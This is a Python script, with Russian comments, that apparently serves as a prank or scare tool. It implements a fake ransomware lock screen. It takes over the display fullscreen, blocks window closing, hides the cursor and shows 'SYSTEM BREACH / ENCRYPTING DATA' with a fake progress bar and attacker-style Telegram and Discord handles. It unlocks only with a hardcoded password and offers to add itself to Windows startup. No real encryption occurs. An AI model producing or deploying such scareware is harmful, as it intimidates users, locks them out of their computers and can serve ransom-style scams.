import tkinter as tk
import threading
import time
import random
import winreg
from tkinter import messagebox
import sys

EXIT_PASSWORD = "02041722"
running = True
fake_encrypt_progress = 0

ASCII_FACE = r"""
        ▄▄▄▄▄▄▄▄▄▄▄▄▄
     ▄██▀▀▀▀▀▀▀▀▀▀▀██▄
   ▄██▀   ███   ███   ▀██▄
  ██▀     ███   ███      ▀██
 ██       ▀▀▀   ▀▀▀        ██
 ██    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄     ██
  ██▄   ▀▀▀▀▀▀▀▀▀▀▀▀▀   ▄██
    ▀██▄                 ▄██▀
        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
"""

# ---------- АВТОЗАПУСК ----------
def add_to_startup():
    exe_path = sys.executable  # путь к .exe
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, "MyMinimalApp", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

def is_in_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(key, "MyMinimalApp")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

def ask_startup_once():
    if is_in_startup():
        return
    root_temp = tk.Tk()
    root_temp.withdraw()
    answer = messagebox.askyesno(
        "Автозагрузка",
        "Добавить программу в автозагрузку Windows?"
    )
    if answer:
        add_to_startup()
    root_temp.destroy()

# ---------- ФЕЙК ШИФРОВАНИЕ ----------
def fake_encrypt():
    global fake_encrypt_progress
    while running and fake_encrypt_progress < 100:
        time.sleep(0.2)
        fake_encrypt_progress += random.randint(1, 3)
        fake_encrypt_progress = min(fake_encrypt_progress, 100)

# ---------- ПЛАВНОЕ МИГАНИЕ ФОНА ----------
def blink_background():
    colors = ["#000000", "#111111", "#222222", "#111111"]
    i = 0
    while running:
        color = colors[i % len(colors)]
        root.configure(bg=color)
        container.configure(bg=color)
        top_label.configure(bg=color)
        ascii_label.configure(bg=color)
        main_label.configure(bg=color)
        entry.configure(bg=color)
        i += 1
        time.sleep(0.3)

# ---------- ГЛИТЧ ТЕКСТА ----------
def glitch_text():
    while running:
        text = f"⚠ SYSTEM BREACH ⚠\nENCRYPTING DATA...\n{fake_encrypt_progress}%"
        if random.random() < 0.25:
            text = text.replace("E", "3").replace("A", "@").replace("S", "$")
        main_label.config(text=text)
        time.sleep(0.2)

# ---------- ВЫХОД ЧЕРЕЗ ПАРОЛЬ ----------
def password_enter(event=None):
    global running
    if entry.get() == EXIT_PASSWORD:
        running = False
        root.destroy()
    else:
        entry.delete(0, tk.END)

# ---------- MAIN ----------
ask_startup_once()  # спрашиваем автозагрузку

root = tk.Tk()
root.attributes("-fullscreen", True)
root.title("SYSTEM BREACH")
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.config(cursor="none")

# Верхняя надпись
top_label = tk.Label(
    root,
    text="Telegram @erezxc   |   Discord @szqxcc_47257",
    fg="red",
    bg="black",
    font=("Consolas", 14, "bold")
)
top_label.pack(pady=10)

container = tk.Frame(root, bg="black")
container.pack(expand=True)

ascii_label = tk.Label(
    container,
    text=ASCII_FACE,
    fg="red",
    bg="black",
    font=("Consolas", 16),
    justify="center"
)
ascii_label.pack(pady=10)

main_label = tk.Label(
    container,
    text="⚠ SYSTEM BREACH ⚠\nENCRYPTING DATA...\n0%",
    fg="red",
    bg="black",
    font=("Consolas", 28, "bold"),
    justify="center"
)
main_label.pack()

# 🔴 Строка для ввода кода
entry = tk.Entry(
    root,
    show="*",
    font=("Consolas", 18),
    bg="black",
    fg="red",
    insertbackground="red",
    relief="flat",
    width=20
)
entry.pack(pady=20)
entry.focus_set()

entry.bind("<Return>", password_enter)

def update_ui():
    main_label.config(
        text=f"⚠ SYSTEM BREACH ⚠\nENCRYPTING DATA...\n{fake_encrypt_progress}%"
    )
    if running:
        root.after(200, update_ui)

# ---------- ПОТОКИ ----------
threading.Thread(target=fake_encrypt, daemon=True).start()
threading.Thread(target=blink_background, daemon=True).start()
threading.Thread(target=glitch_text, daemon=True).start()

update_ui()
root.mainloop()
